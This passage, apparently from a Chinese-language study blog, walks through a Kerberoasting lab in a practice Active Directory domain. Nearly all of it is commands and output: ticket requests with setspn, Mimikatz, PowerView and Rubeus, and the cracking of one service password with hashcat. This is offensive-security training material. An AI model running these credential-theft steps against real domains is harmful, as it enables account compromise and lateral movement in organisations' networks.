<h3 id="使用-setspn-exe-检索所有票据"><a href="#使用-setspn-exe-检索所有票据" class="headerlink" title="使用 setspn.exe 检索所有票据"></a>使用 setspn.exe 检索所有票据</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; setspn.exe <span class="literal">-T</span> INLANEFREIGHT.LOCAL <span class="literal">-Q</span> */* | <span class="built_in">Select-String</span> <span class="string">&#x27;^CN&#x27;</span> <span class="literal">-Context</span> <span class="number">0</span>,<span class="number">1</span> | % &#123; <span class="built_in">New-Object</span> System.IdentityModel.Tokens.KerberosRequestorSecurityToken <span class="literal">-ArgumentList</span> <span class="variable">$_</span>.Context.PostContext[<span class="number">0</span>].Trim() &#125;</span><br><span class="line"></span><br><span class="line">Id                   : uuid<span class="literal">-67a2100c-150f-477c-a28a-19f6cfed4e90-3</span></span><br><span class="line">SecurityKeys         : &#123;System.IdentityModel.Tokens.InMemorySymmetricSecurityKey&#125;</span><br><span class="line">ValidFrom            : <span class="number">2</span>/<span class="number">24</span>/<span class="number">2022</span> <span class="number">11</span>:<span class="number">56</span>:<span class="number">18</span> PM</span><br><span class="line">ValidTo              : <span class="number">2</span>/<span class="number">25</span>/<span class="number">2022</span> <span class="number">8</span>:<span class="number">55</span>:<span class="number">25</span> AM</span><br><span class="line">ServicePrincipalName : exchangeAB/ACADEMY<span class="literal">-EA-DC01</span></span><br><span class="line">SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey</span><br><span class="line"></span><br><span class="line">Id                   : uuid<span class="literal">-67a2100c-150f-477c-a28a-19f6cfed4e90-4</span></span><br><span class="line">SecurityKeys         : &#123;System.IdentityModel.Tokens.InMemorySymmetricSecurityKey&#125;</span><br><span class="line">ValidFrom            : <span class="number">2</span>/<span class="number">24</span>/<span class="number">2022</span> <span class="number">11</span>:<span class="number">56</span>:<span class="number">18</span> PM</span><br><span class="line">ValidTo              : <span class="number">2</span>/<span class="number">24</span>/<span class="number">2022</span> <span class="number">11</span>:<span class="number">58</span>:<span class="number">18</span> PM</span><br><span class="line">ServicePrincipalName : kadmin/changepw</span><br><span class="line">SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey</span><br><span class="line"></span><br><span class="line">Id                   : uuid<span class="literal">-67a2100c-150f-477c-a28a-19f6cfed4e90-5</span></span><br><span class="line">SecurityKeys         : &#123;System.IdentityModel.Tokens.InMemorySymmetricSecurityKey&#125;</span><br><span class="line">ValidFrom            : <span class="number">2</span>/<span class="number">24</span>/<span class="number">2022</span> <span class="number">11</span>:<span class="number">56</span>:<span class="number">18</span> PM</span><br><span class="line">ValidTo              : <span class="number">2</span>/<span class="number">25</span>/<span class="number">2022</span> <span class="number">8</span>:<span class="number">55</span>:<span class="number">25</span> AM</span><br><span class="line">ServicePrincipalName : WSMAN/ACADEMY<span class="literal">-EA-MS01</span></span><br><span class="line">SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h2 id="使用-Mimikatz-从内存中提取票据"><a href="#使用-Mimikatz-从内存中提取票据" class="headerlink" title="使用 Mimikatz 从内存中提取票据"></a>使用 Mimikatz 从内存中提取票据</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Using &#x27;mimikatz.log&#x27; <span class="keyword">for</span> logfile : OK</span><br><span class="line"></span><br><span class="line">mimikatz # base64 /out:true</span><br><span class="line">isBase64InterceptInput  is false</span><br><span class="line">isBase64InterceptOutput is true</span><br><span class="line"></span><br><span class="line">mimikatz # kerberos::list /export  </span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">[<span class="number">00000002</span>] - <span class="number">0</span>x00000017 - rc4_hmac_nt      </span><br><span class="line">   <span class="built_in">Start</span>/End/MaxRenew: <span class="number">2</span>/<span class="number">24</span>/<span class="number">2022</span> <span class="number">3</span>:<span class="number">36</span>:<span class="number">22</span> PM ; <span class="number">2</span>/<span class="number">25</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">55</span>:<span class="number">25</span> AM ; <span class="number">3</span>/<span class="number">3</span>/<span class="number">2022</span> <span class="number">2</span>:<span class="number">55</span>:<span class="number">25</span> PM</span><br><span class="line">   Server Name       : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:<span class="number">1433</span> @ INLANEFREIGHT.LOCAL</span><br><span class="line">   Client Name       : htb-student @ INLANEFREIGHT.LOCAL</span><br><span class="line">   Flags <span class="number">40</span>a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; </span><br><span class="line">====================</span><br><span class="line">Base64 of file : <span class="number">2</span>-<span class="number">40</span>a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~<span class="number">1433</span>-INLANEFREIGHT.LOCAL.kirbi</span><br><span class="line">====================</span><br><span class="line">doIGPzCCBjugAwIBBaEDAgEWooIFKDCCBSRhggUgMIIFHKADAgEFoRUbE0lOTEFO</span><br><span class="line">....</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">   * Saved to file     : <span class="number">2</span>-<span class="number">40</span>a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~<span class="number">1433</span>-INLANEFREIGHT.LOCAL.kirbi</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h3 id="准备用于破解的-Base64-Blob"><a href="#准备用于破解的-Base64-Blob" class="headerlink" title="准备用于破解的 Base64 Blob"></a>准备用于破解的 Base64 Blob</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ <span class="built_in">echo</span> <span class="string">&quot;&lt;base64 blob&gt;&quot;</span> |  <span class="built_in">tr</span> -d \\n </span><br><span class="line"></span><br><span class="line">doIGPzCCBjugAwIBBaEDAgEWooIFKDCCBSRhggUgMIIF....</span><br></pre></td></tr></table></figure>

<h3 id="将输出保存为-kirbi-文件"><a href="#将输出保存为-kirbi-文件" class="headerlink" title="将输出保存为 .kirbi 文件"></a>将输出保存为 .kirbi 文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ <span class="built_in">cat</span> encoded_file | <span class="built_in">base64</span> -d &gt; sqldev.kirbi</span><br></pre></td></tr></table></figure>

<h3 id="执行破解"><a href="#执行破解" class="headerlink" title="执行破解"></a>执行破解</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ python2.7 kirbi2john.py sqldev.kirbi</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ sed <span class="string">&#x27;s/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/&#x27;</span> crack_file &gt; sqldev_tgs_hashcat</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ <span class="built_in">cat</span> sqldev_tgs_hashcat </span><br><span class="line"></span><br><span class="line">$krb5tgs$23$*sqldev.kirbi*<span class="variable">$813149fb261</span>....</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt </span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">$krb5tgs$23$*sqldev.kirbi*$813149fb261549a6a1b4965ed49d1ba8$....:database!</span><br><span class="line">                                                 </span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Name........: Kerberos 5, etype 23, TGS-REP</span><br><span class="line">Hash.Target......: $krb5tgs$23$*sqldev.kirbi*<span class="variable">$813149fb261549a6a1b4965e</span>...7feeab</span><br><span class="line">Time.Started.....: Thu Feb 24 22:03:03 2022 (8 secs)</span><br><span class="line">Time.Estimated...: Thu Feb 24 22:03:11 2022 (0 secs)</span><br><span class="line">Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.<span class="comment">#1.........:  1150.5 kH/s (9.76ms) @ Accel:64 Loops:1 Thr:64 Vec:8</span></span><br><span class="line">Recovered........: 1/1 (100.00%) Digests</span><br><span class="line">Progress.........: 8773632/14344385 (61.16%)</span><br><span class="line">Rejected.........: 0/8773632 (0.00%)</span><br><span class="line">Restore.Point....: 8749056/14344385 (60.99%)</span><br><span class="line">Restore.Sub.<span class="comment">#1...: Salt:0 Amplifier:0-1 Iteration:0-1</span></span><br><span class="line">Candidates.<span class="comment">#1....: davius -&gt; darjes</span></span><br><span class="line"></span><br><span class="line">Started: Thu Feb 24 22:03:00 2022</span><br><span class="line">Stopped: Thu Feb 24 22:03:11 2022</span><br></pre></td></tr></table></figure>

<h2 id="自动化-工具化路线"><a href="#自动化-工具化路线" class="headerlink" title="自动化&#x2F;工具化路线"></a>自动化&#x2F;工具化路线</h2><h3 id="使用-PowerView-提取-TGS-票据"><a href="#使用-PowerView-提取-TGS-票据" class="headerlink" title="使用 PowerView 提取 TGS 票据"></a>使用 PowerView 提取 TGS 票据</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Import-Module</span> .\PowerView.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-DomainUser</span> * <span class="literal">-spn</span> | <span class="built_in">select</span> samaccountname</span><br><span class="line"></span><br><span class="line">samaccountname</span><br><span class="line"><span class="literal">--------------</span></span><br><span class="line">adfs</span><br><span class="line">backupagent</span><br><span class="line">krbtgt</span><br><span class="line">sqldev</span><br><span class="line">sqlprod</span><br><span class="line">sqlqa</span><br><span class="line">solarwindsmonitor</span><br></pre></td></tr></table></figure>

<h3 id="使用-PowerView-针对特定用户"><a href="#使用-PowerView-针对特定用户" class="headerlink" title="使用 PowerView 针对特定用户"></a>使用 PowerView 针对特定用户</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-DomainUser</span> <span class="literal">-Identity</span> sqldev | <span class="built_in">Get-DomainSPNTicket</span> <span class="literal">-Format</span> Hashcat</span><br><span class="line"></span><br><span class="line">SamAccountName       : sqldev</span><br><span class="line">DistinguishedName    : CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ServicePrincipalName : MSSQLSvc/DEV<span class="literal">-PRE-SQL</span>.inlanefreight.local:<span class="number">1433</span></span><br><span class="line">TicketByteHexStream  :</span><br><span class="line">Hash                 : <span class="variable">$krb5tgs</span><span class="variable">$23</span><span class="variable">$</span>*sqldev<span class="variable">$INLANEFREIGHT</span>.LOCAL<span class="variable">$MSSQLSvc</span>/DEV<span class="literal">-PRE-SQL</span>.inlanefreight.local:<span class="number">1433</span>*<span class="variable">$BF9729001</span></span><br><span class="line">                       <span class="number">376</span>B63C5CAC933493C58CE7</span><br></pre></td></tr></table></figure>

<h3 id="导出所有票据到-CSV-文件"><a href="#导出所有票据到-CSV-文件" class="headerlink" title="导出所有票据到 CSV 文件"></a>导出所有票据到 CSV 文件</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-DomainUser</span> * <span class="literal">-SPN</span> | <span class="built_in">Get-DomainSPNTicket</span> <span class="literal">-Format</span> Hashcat | <span class="built_in">Export-Csv</span> .\ilfreight_tgs.csv <span class="literal">-NoTypeInformation</span></span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">cat</span> .\ilfreight_tgs.csv</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;SamAccountName&quot;</span>,<span class="string">&quot;DistinguishedName&quot;</span>,<span class="string">&quot;ServicePrincipalName&quot;</span>,<span class="string">&quot;TicketByteHexStream&quot;</span>,<span class="string">&quot;Hash&quot;</span></span><br><span class="line"><span class="string">&quot;adfs&quot;</span>,<span class="string">&quot;CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span>,<span class="string">&quot;adfsconnect/azure01.inlanefreight.local&quot;</span>,,<span class="string">&quot;<span class="variable">$krb5tgs</span><span class="variable">$23</span><span class="variable">$</span>*adfs<span class="variable">$INLANEFREIGHT</span>.LOCAL<span class="variable">$adfsconnect</span>/azure01.inlanefreight.local*<span class="variable">$59C086008BBE7EAE4E483506632F6EF8</span><span class="variable">$622D9E1DBCB1FF2183482478B5559905E0CCBDEA2B52A5D9F510048481F2A3A4D2CC47345283A9E71D65E1573DCF6F2380A6FFF470722B5DEE704C51FF3A3C2CDB2945CA56F7763E117F04F26CA71EEACED25730FDCB06297ED4076C9CE1A1DBFE961DCE13C2D6455339D0D90983895D882CFA21656E41C3DDDC4951D1031EC8173BEEF9532337135A4CF70AE08F0FB34B6C1E3104F35D9B84E7DF7AC72F514BE2B346954C7F8C0748E46A28CCE765AF31628D3522A1E90FA187A124CA9D5F911318752082FF525B0BE1401FBA745E1</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;SNIP&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="使用-Rubeus"><a href="#使用-Rubeus" class="headerlink" title="使用 Rubeus"></a>使用 Rubeus</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; .\Rubeus.exe</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">Roasting:</span><br><span class="line"></span><br><span class="line">    Perform Kerberoasting:</span><br><span class="line">        Rubeus.exe kerberoast [[/<span class="type">spn</span>:<span class="string">&quot;blah/blah&quot;</span>] | [/<span class="type">spns</span>:<span class="type">C</span>:\<span class="type">temp</span>\<span class="type">spns.txt</span>]] [/<span class="type">user</span>:<span class="type">USER</span>] [/<span class="type">domain</span>:<span class="type">DOMAIN</span>] [/<span class="type">dc</span>:<span class="type">DOMAIN_CONTROLLER</span>] [/<span class="type">ou</span>:<span class="string">&quot;OU=,...&quot;</span>] [/<span class="type">ldaps</span>] [/<span class="type">nowrap</span>]</span><br><span class="line"></span><br><span class="line">    Perform Kerberoasting, outputting hashes to a file:</span><br><span class="line">        Rubeus.exe kerberoast /outfile:hashes.txt [[/<span class="type">spn</span>:<span class="string">&quot;blah/blah&quot;</span>] | [/<span class="type">spns</span>:<span class="type">C</span>:\<span class="type">temp</span>\<span class="type">spns.txt</span>]] [/<span class="type">user</span>:<span class="type">USER</span>] [/<span class="type">domain</span>:<span class="type">DOMAIN</span>] [/<span class="type">dc</span>:<span class="type">DOMAIN_CONTROLLER</span>] [/<span class="type">ou</span>:<span class="string">&quot;OU=,...&quot;</span>] [/<span class="type">ldaps</span>]</span><br><span class="line"></span><br><span class="line">    Perform Kerberoasting, outputting hashes <span class="keyword">in</span> the file output format, but to the console:</span><br><span class="line">        Rubeus.exe kerberoast /simple [[/<span class="type">spn</span>:<span class="string">&quot;blah/blah&quot;</span>] | [/<span class="type">spns</span>:<span class="type">C</span>:\<span class="type">temp</span>\<span class="type">spns.txt</span>]] [/<span class="type">user</span>:<span class="type">USER</span>] [/<span class="type">domain</span>:<span class="type">DOMAIN</span>] [/<span class="type">dc</span>:<span class="type">DOMAIN_CONTROLLER</span>] [/<span class="type">ou</span>:<span class="string">&quot;OU=,...&quot;</span>] [/<span class="type">ldaps</span>] [/<span class="type">nowrap</span>]</span><br><span class="line"></span><br><span class="line">    Perform Kerberoasting with alternate credentials:</span><br><span class="line">        Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/<span class="type">spn</span>:<span class="string">&quot;blah/blah&quot;</span>] [/<span class="type">user</span>:<span class="type">USER</span>] [/<span class="type">domain</span>:<span class="type">DOMAIN</span>] [/<span class="type">dc</span>:<span class="type">DOMAIN_CONTROLLER</span>] [/<span class="type">ou</span>:<span class="string">&quot;OU=,...&quot;</span>] [/<span class="type">ldaps</span>] [/<span class="type">nowrap</span>]</span><br><span class="line"></span><br><span class="line">    Perform Kerberoasting with an existing TGT:</span><br><span class="line">        Rubeus.exe kerberoast &lt;/spn:<span class="string">&quot;blah/blah&quot;</span> | /spns:C:\temp\spns.txt&gt; &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; [/<span class="type">nowrap</span>]</span><br><span class="line"></span><br><span class="line">    Perform Kerberoasting with an existing TGT <span class="keyword">using</span> an enterprise principal:</span><br><span class="line">        Rubeus.exe kerberoast &lt;/spn:user@domain.com | /spns:user1@domain.com,user2@domain.com&gt; /enterprise &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; [/<span class="type">nowrap</span>]</span><br><span class="line"></span><br><span class="line">    Perform Kerberoasting with an existing TGT and automatically retry with the enterprise principal <span class="keyword">if</span> any fail:</span><br><span class="line">        Rubeus.exe kerberoast &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; /autoenterprise [/<span class="type">ldaps</span>] [/<span class="type">nowrap</span>]</span><br><span class="line"></span><br><span class="line">    Perform Kerberoasting <span class="keyword">using</span> the tgtdeleg ticket to request service tickets - requests RC4 for AES accounts:</span><br><span class="line">        Rubeus.exe kerberoast /usetgtdeleg [/<span class="type">ldaps</span>] [/<span class="type">nowrap</span>]</span><br><span class="line"></span><br><span class="line">    Perform <span class="string">&quot;opsec&quot;</span> Kerberoasting, <span class="keyword">using</span> tgtdeleg, and filtering out AES-enabled accounts:</span><br><span class="line">        Rubeus.exe kerberoast /rc4opsec [/<span class="type">ldaps</span>] [/<span class="type">nowrap</span>]</span><br><span class="line"></span><br><span class="line">    List statistics about found Kerberoastable accounts without actually sending ticket requests:</span><br><span class="line">        Rubeus.exe kerberoast /stats [/<span class="type">ldaps</span>] [/<span class="type">nowrap</span>]</span><br><span class="line"></span><br><span class="line">    Perform Kerberoasting, requesting tickets only <span class="keyword">for</span> accounts with an admin count of <span class="number">1</span> (custom LDAP <span class="keyword">filter</span>):</span><br><span class="line">        Rubeus.exe kerberoast /ldapfilter:<span class="string">&#x27;admincount=1&#x27;</span> [/<span class="type">ldaps</span>] [/<span class="type">nowrap</span>]</span><br><span class="line"></span><br><span class="line">    Perform Kerberoasting, requesting tickets only <span class="keyword">for</span> accounts whose password was last <span class="built_in">set</span> between <span class="number">01</span><span class="literal">-31-2005</span> and <span class="number">03</span><span class="literal">-29-2010</span>, returning up to <span class="number">5</span> service tickets:</span><br><span class="line">        Rubeus.exe kerberoast /pwdsetafter:<span class="number">01</span><span class="literal">-31-2005</span> /pwdsetbefore:<span class="number">03</span><span class="literal">-29-2010</span> /resultlimit:<span class="number">5</span> [/<span class="type">ldaps</span>] [/<span class="type">nowrap</span>]</span><br><span class="line"></span><br><span class="line">    Perform Kerberoasting, with a delay of <span class="number">5000</span> milliseconds and a jitter of <span class="number">30</span>%:</span><br><span class="line">        Rubeus.exe kerberoast /delay:<span class="number">5000</span> /jitter:<span class="number">30</span> [/<span class="type">ldaps</span>] [/<span class="type">nowrap</span>]</span><br><span class="line"></span><br><span class="line">    Perform AES Kerberoasting:</span><br><span class="line">        Rubeus.exe kerberoast /aes [/<span class="type">ldaps</span>] [/<span class="type">nowrap</span>]</span><br></pre></td></tr></table></figure>

<h3 id="使用-stats-标志"><a href="#使用-stats-标志" class="headerlink" title="使用 &#x2F;stats 标志"></a>使用 &#x2F;stats 标志</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; .\Rubeus.exe kerberoast /stats</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.<span class="number">0.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Action: Kerberoasting</span><br><span class="line"></span><br><span class="line">[*] Listing statistics about target users, no ticket requests being performed.</span><br><span class="line">[*] Target Domain          : INLANEFREIGHT.LOCAL</span><br><span class="line">[*] Searching path <span class="string">&#x27;LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL&#x27;</span> <span class="keyword">for</span> <span class="string">&#x27;(&amp;(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] Total kerberoastable users : <span class="number">9</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="literal">------------------------------------------------------------</span></span><br><span class="line"> | Supported Encryption <span class="built_in">Type</span>                        | Count |</span><br><span class="line"> <span class="literal">------------------------------------------------------------</span></span><br><span class="line"> | RC4_HMAC_DEFAULT                                 | <span class="number">7</span>     |</span><br><span class="line"> | AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96 | <span class="number">2</span>     |</span><br><span class="line"> <span class="literal">------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"> <span class="literal">----------------------------------</span></span><br><span class="line"> | Password Last <span class="built_in">Set</span> Year | Count |</span><br><span class="line"> <span class="literal">----------------------------------</span></span><br><span class="line"> | <span class="number">2022</span>                   | <span class="number">9</span>     |</span><br><span class="line"> <span class="literal">----------------------------------</span></span><br></pre></td></tr></table></figure>

<h3 id="使用-nowrap-标志"><a href="#使用-nowrap-标志" class="headerlink" title="使用 &#x2F;nowrap 标志"></a>使用 &#x2F;nowrap 标志</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; .\Rubeus.exe kerberoast /ldapfilter:<span class="string">&#x27;admincount=1&#x27;</span> /nowrap</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.<span class="number">0.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Action: Kerberoasting</span><br><span class="line"></span><br><span class="line">[*] NOTICE: AES hashes will be returned <span class="keyword">for</span> AES<span class="literal">-enabled</span> accounts.</span><br><span class="line">[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC <span class="keyword">for</span> these accounts.</span><br><span class="line"></span><br><span class="line">[*] Target Domain          : INLANEFREIGHT.LOCAL</span><br><span class="line">[*] Searching path <span class="string">&#x27;LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL&#x27;</span> <span class="keyword">for</span> <span class="string">&#x27;(&amp;(&amp;(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))(admincount=1))&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] Total kerberoastable users : <span class="number">3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] SamAccountName         : backupagent</span><br><span class="line">[*] DistinguishedName      : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">[*] ServicePrincipalName   : backupjob/veam001.inlanefreight.local</span><br><span class="line">[*] PwdLastSet             : <span class="number">2</span>/<span class="number">15</span>/<span class="number">2022</span> <span class="number">2</span>:<span class="number">15</span>:<span class="number">40</span> PM</span><br><span class="line">[*] Supported ETypes       : RC4_HMAC_DEFAULT</span><br><span class="line">[*] Hash                   : <span class="variable">$krb5tgs</span><span class="variable">$23</span><span class="variable">$</span>*backupagent<span class="variable">$INLANEFREIGHT</span>.LOCAL<span class="variable">$backupjob</span>/veam001.inlanefreight.local@INLANEFREIGHT.LOCAL*<span class="variable">$750F377DEFA85A67EA0FE51B0B28F83D</span><span 